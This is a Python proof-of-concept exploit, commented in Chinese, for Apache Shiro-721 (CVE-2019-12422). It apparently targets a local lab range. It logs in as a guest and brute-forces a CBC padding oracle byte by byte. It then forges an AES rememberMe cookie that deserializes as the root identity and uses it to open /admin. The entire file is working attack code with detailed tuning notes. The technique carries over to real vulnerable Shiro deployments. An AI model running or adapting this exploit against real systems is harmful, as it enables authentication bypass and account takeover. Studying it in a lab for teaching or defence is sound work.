#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shiro-721 (CVE-2019-12422) —— padding oracle 伪造身份，零第三方依赖

先说清楚它为什么存在：
    1.2.5 修掉了 550 —— rememberMe 的密钥不再写死，改成每次启动随机生成。
    但加密方式还是 AES/CBC/PKCS5，只加密、不认证。
    CBC 有个老毛病：改了密文，只有"被改坏的那一块"和"下一块"受影响。
    服务端解密后要校验 PKCS#5 填充，填充错了和填充对了的表现不一样——
    这个"不一样"就是 oracle，一个字节一个字节往外问，能把明文整段推出来，
    过程中完全不需要知道密钥。

完整攻击链（本脚本做的事）：
    1. 用 guest/guest123 正常登录，勾选"记住我" → 服务端给一个合法 cookie
       这时我们知道：这是一段 AES 密文，明文是 Shiro 序列化后的身份对象，
       但不知道内容、也不知道 key
    2. 用 /__oracle 当 oracle：改密文的最后一个字节，看填充是否还合法
       合法 → 推出明文最后一块的对应字节 → 继续往前推
    3. 推出所有中间值 D(Ci) 之后，就能任意构造明文：
         新 IV   = D(C1)  xor 目标明文第 1 块
         新 Ci   = D(Ci+1) xor 目标明文第 i+1 块
       最后一块保留原样（它负责"填充合法"这件事）
    4. 目标是 root 的 PrincipalCollection 序列化字节。Shiro 把这段字节
       原样反序列化成"已认证的身份"，于是我们成了 root

为什么不直接 XOR 改 guest→admin：
    root 比 guest 短一个字节，长度都变了，单纯翻位会让序列化结构错位。
    （如果长度刚好一样，确实可以跳过 oracle —— 但那属于碰运气，
     碰到 gadget 那种上千字节的 payload 就没法碰了。）

用法：
    python3 poc/shiro721_exp.py
    python3 poc/shiro721_exp.py --url http://127.0.0.1:8902 --workers 16
"""

import argparse
import base64
import http.client
import os
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
BLOCK = 16

_local = threading.local()
_POOL = None
HOST = "127.0.0.1"
PORT = 8902


def _get_pool(workers):
    """
    整个攻击过程共用一个线程池。

    每次爆破字节都新建池的话，线程和它们持有的长连接全部丢弃，
    几万次请求下来本机端口会被耗光，表现为"跑到一半随机拿不到 oracle"。
    """
    global _POOL
    if _POOL is None:
        _POOL = ThreadPoolExecutor(max_workers=workers)
    return _POOL


# ---------------------------------------------------------------------------
#  HTTP：复用连接，padding oracle 要发上万次请求，每次重连会慢一个数量级
# ---------------------------------------------------------------------------
def _conn():
    c = getattr(_local, "c", None)
    if c is None:
        c = http.client.HTTPConnection(HOST, PORT, timeout=15)
        _local.c = c
    return c


def _drop_conn():
    c = getattr(_local, "c", None)
    if c is not None:
        try:
            c.close()
        except Exception:
            pass
    _local.c = None


def request(method, path, body=None, headers=None):
    for _ in range(2):
        try:
            c = _conn()
            c.request(method, path, body=body, headers=headers or {})
            return c.getresponse()
        except Exception:
            _drop_conn()
    raise RuntimeError("请求失败：%s %s" % (method, path))


def oracle(cookie_bytes):
    """
    返回 True 表示"服务端认为填充合法"（解密成功）。

    判定走状态码：
        204 → 填充合法（反序列化成没成功都一样，我们只要这一位信息）
        400 → 填充非法
        404 → 这个端口没开 721 模式
    三态贴在响应头 X-Lab-Oracle 里只是给人看的，脚本不依赖它——
    头要在过滤器里补，响应一 commit 就丢了，并发下会随机消失。
    """
    b64 = base64.b64encode(cookie_bytes).decode()
    for _ in range(3):
        try:
            r = request("GET", "/__oracle", headers={"Cookie": "rememberMe=" + b64})
            status = r.status
            r.read()
        except Exception:
            _drop_conn()
            continue

        if status == 204:
            return True
        if status == 400:
            return False
        if status == 404:
            raise SystemExit("[x] /__oracle 返回 404：这个端口没开 721 模式，确认打的是 8902。")
        # 500 之类的服务端异常：重试，别急着判定
        _drop_conn()
    return False


# ---------------------------------------------------------------------------
#  登录拿一个合法 cookie
# ---------------------------------------------------------------------------
def login(username, password):
    body = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "rememberMe": "1",
    }).encode()
    r = request("POST", "/login", body=body, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
    })
    cookies = r.getheaders()
    r.read()

    for name, value in cookies:
        if name.lower() != "set-cookie":
            continue
        first = value.split(";")[0].strip()
        if first.startswith("rememberMe=") and first != "rememberMe=deleteMe":
            raw = first[len("rememberMe="):]
            return base64.b64decode(raw)
    raise SystemExit("[x] 登录没拿到 rememberMe cookie（账号密码对吗？）")


# ---------------------------------------------------------------------------
#  padding oracle 核心：求 D(Ci)
# ---------------------------------------------------------------------------
def recover_one(blocks, i, workers, progress):
    """
    求出第 i 块密文的"中间值" D(Ci)。

    CBC 解密第 i 块：P(i) = C(i-1) xor D(Ci)
    所以想控制 P(i)，就要先知道 D(Ci)；改 C(i-1) 的字节等于直接改 P(i)。

    逐个字节从后往前求：
      - 目标字节 j 之前（j+1..15）已经求出，按"要形成的填充值"反推 C(i-1) 的字节
      - 猜 C(i-1)[j] 从 0x00 到 0xff，哪个让服务端认为填充合法，就是它
      - 命中后要二次验证，排除"本来就有更长填充"的假阳性

    ⚠ 这里有个一定要做对的地方：**每次只发两块**（C(i-1) 和 C(i)）。
    服务端只校验"最后一块"的填充。如果老老实实把整条 cookie 发过去，
    改 C(i-1) 只会影响 P(i)，而最后一块 P(n) 的填充压根没被动过——
    于是不管猜什么值，服务端都说"填充合法"，一个字节都求不出来。
    我第一次跑就栽在这里：D 全错，但自检还能过（因为自检正好动的是最后一块）。
    把密文截成 [C(i-1), C(i)]，让第 i 块变成"最后一块"，填充校验才对准我们。
    """
    known = bytearray(BLOCK)     # 存 D(Ci)，未知的位先当 0

    for j in range(BLOCK - 1, -1, -1):
        pad_value = BLOCK - j

        base = bytearray(blocks[i - 1])
        for k in range(j + 1, BLOCK):
            base[k] = known[k] ^ pad_value

        def probe(guess, _base=base, _j=j, _i=i):
            cand = bytearray(_base)
            cand[_j] = guess
            # 两块：cand 当 IV 用，blocks[i] 是被解密的那块
            return guess, oracle(bytes(cand) + bytes(blocks[_i]))

        hits = []
        for guess, ok in _get_pool(workers).map(probe, range(256)):
            if ok:
                hits.append(guess)

        chosen = None
        for guess in hits:
            if j == 0:
                chosen = guess
                break
            # 二次验证：padding 长度如果是 pad_value，那 P[j-1] 不在填充范围内，
            # 改掉它填充仍然合法；反之说明碰上了更长的填充，是假阳性。
            verify = bytearray(base)
            verify[j] = guess
            verify[j - 1] ^= 0x01
            if oracle(bytes(verify) + bytes(blocks[i])):
                chosen = guess
                break

        if chosen is None:
            raise SystemExit(
                "[x] 第 %d 块第 %d 字节没爆破出来。\n"
                "    多半是 oracle 判定不稳（真实环境常见），重跑一次，"
                "或者把 --workers 调小。" % (i, j))

        # 串行复核两次。并发扫的时候偶发误判会把假阳性当成真值，
        # 结果就是"24 块全对、偏偏某一块错一个字节"，后面反序列化直接崩。
        # 这种事静默发生最难查，所以宁可多花两次请求把它挡在这里。
        for _ in range(2):
            cand = bytearray(base)
            cand[j] = chosen
            if not oracle(bytes(cand) + bytes(blocks[i])):
                raise SystemExit(
                    "[x] 第 %d 块第 %d 字节复核不通过：oracle 在并发下不稳定。\n"
                    "    --workers 调小（比如 2）重跑。" % (i, j))

        known[j] = chosen ^ pad_value
        progress(i, j, known)

    return bytes(known)


# ---------------------------------------------------------------------------
#  伪造密文
# ---------------------------------------------------------------------------
def recover_middle(block, workers, progress=None):
    """
    求"某一块密文"的中间值 D(block)。

    做法：把它当成最后一块，前面随便放一个可控的 IV，爆破它的填充。
    这就是 padding oracle 最原始的用法——只解密一个块。
    """
    blocks = [bytearray(BLOCK), bytearray(block)]
    return recover_one(blocks, 1, workers, progress or (lambda *a: None))


def forge(payload, workers, progress=None):
    """
    在**不知道密钥**的前提下，构造一段能解出任意明文的密文。

    这是 721 最反直觉的地方，也是我第一次写错的地方：

    直觉上会想"用原 cookie 的中间值 D(Ci) 去拼新密文"。不行。
    因为拼出来的块是**新块**，服务端解密它时用的是新块自己的中间值，
    而那个值我们根本没算过。拿原块的 D 去套新块，解出来是乱码。

    正确做法是**逐块倒着造，每造一块就爆破一次它的中间值**：

        cur = 随机块（当"最后一块"）
        for i = k-1 .. 0:
            D     = 爆破 D(cur)          ← 关键：每块都要单独爆破
            prev  = D xor 明文块[i]       ← 前一块，作为 cur 的 IV
            chain = [cur] + chain
            cur   = prev

    最后 cur 就是整条密文的 IV。整条密文是 [IV, C1, ..., Ck]，
    解密后正好是 payload + PKCS5 填充。

    代价：k 块 × 16 字节 × 256 次请求。payload 越大越慢，这就是为什么
    真实 721 利用经常要跑几十分钟，也是它"实战不太实用"的原因。
    """
    pad = BLOCK - len(payload) % BLOCK
    body = payload + bytes([pad]) * pad
    k = len(body) // BLOCK
    chunks = [body[i * BLOCK:(i + 1) * BLOCK] for i in range(k)]

    cur = bytearray(os.urandom(BLOCK))
    chain = []
    for i in range(k - 1, -1, -1):
        if progress:
            progress(k - i, k)
        middle = recover_middle(cur, workers)
        chain.insert(0, bytes(cur))
        cur = bytearray(a ^ b for a, b in zip(middle, chunks[i]))
    return bytes(cur) + b"".join(chain)


# ---------------------------------------------------------------------------
def main():
    global HOST, PORT

    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8902")
    ap.add_argument("--workers", type=int, default=1,
                    help="并发数。1 = 纯串行最稳；调大更快，但 oracle 不稳时会误判。")
    ap.add_argument("--user", default="guest")
    ap.add_argument("--password", default="guest123")
    args = ap.parse_args()

    url = args.url.replace("http://", "")
    if ":" in url:
        HOST, PORT = url.split(":")[0], int(url.split(":")[1])
    else:
        HOST = url

    print("[*] 目标 %s:%d" % (HOST, PORT))

    # 0. 先确认这个端口真的会吐 oracle，别等爆破到一半才发现打错靶场
    r = request("GET", "/__oracle")
    boot = r.status
    r.read()
    if boot == 404:
        raise SystemExit("[x] /__oracle 返回 404：这个端口没开 721 模式，确认打的是 8902。")
    if boot not in (204, 400):
        raise SystemExit("[x] /__oracle 返回了意外状态 %d，目标可能不是这个靶场。" % boot)

    # 1. 正常登录，拿一个真正合法的 cookie
    cookie = login(args.user, args.password)
    blocks = [bytearray(cookie[i:i + BLOCK]) for i in range(0, len(cookie), BLOCK)]
    n = len(blocks) - 1
    print("[+] 登录成功，rememberMe cookie %d 字节 = IV + %d 块密文" % (len(cookie), n))
    if n < 1:
        raise SystemExit("[x] cookie 太短，没法做 CBC 攻击")

    # 2. 先确认 oracle 真的可用：把最后一块的明文做成全 0x10 填充
    print("[*] 自检 oracle ...")
    d_last = recover_middle(blocks[n], args.workers)
    # 把最后一块的明文做成纯 0x10 填充，服务端应当接受这个填充
    probe_iv = bytearray(a ^ 0x10 for a in d_last)
    if not oracle(bytes(probe_iv) + bytes(blocks[n])):
        raise SystemExit("[x] 自检失败：把最后一块改成纯填充，oracle 却说填充非法。\n"
                         "    说明判定条件反了，或者服务端不是这个实现。")
    print("[+] oracle 可用（自检：伪造出合法的 16 字节填充，服务端接受了）")

    # 3. 下载 root 的 PrincipalCollection 序列化字节
    r = request("GET", "/payloads/principal_root.bin")
    payload = r.read()
    if len(payload) < 50:
        raise SystemExit("[x] /payloads/principal_root.bin 取不到")
    k = (len(payload) // BLOCK) + 1
    print("[*] 目标明文：%d 字节（SimplePrincipalCollection(\"root\")），要造 %d 块密文" % (len(payload), k))

    # 4. 逐块倒着造密文。每块都要单独爆破一次中间值 —— 没有捷径。
    t0 = time.time()

    def block_progress(done, total):
        sys.stdout.write("\r    正在造第 %d/%d 块密文   已用 %.1fs"
                         % (done, total, time.time() - t0))
        sys.stdout.flush()

    forged = forge(payload, args.workers, block_progress)
    print("\n[+] 密文构造完成，用时 %.1f 秒（%d 字节）" % (time.time() - t0, len(forged)))

    # 5. 访问 /admin
    b64 = base64.b64encode(forged).decode()

    r = request("GET", "/admin", headers={"Cookie": "rememberMe=" + b64})
    body = r.read().decode("utf-8", "replace")
    status = r.status

    print("\n[*] HTTP %d" % status)
    if "FLAG{" in body:
        start = body.find("FLAG{")
        end = body.find("}", start)
        print("[+] flag：%s" % body[start:end + 1])
        print("[+] 全程没有用到 AES 密钥 —— 只有 oracle 和异或。")
    else:
        print("[!] /admin 没有给 flag。")
        # 直接看服务端对这条伪造 cookie 的判定：ok=反序列化也成功了，deser=只过了填充
        raw = request("GET", "/__oracle", headers={"Cookie": "rememberMe=" + b64})
        print("[!] oracle 原始判定：%s" % raw.getheader("X-Lab-Oracle"))
        raw.read()
        home = request("GET", "/", headers={"Cookie": "rememberMe=" + b64})
        text = home.read().decode("utf-8", "replace")
        mark = text.find("当前身份")
        print("[!] 首页身份区：%s" % text[mark:mark + 220].replace("\n", " "))
        print("[!] 响应片段：%s" % body[:200])


if __name__ == "__main__":
    main()
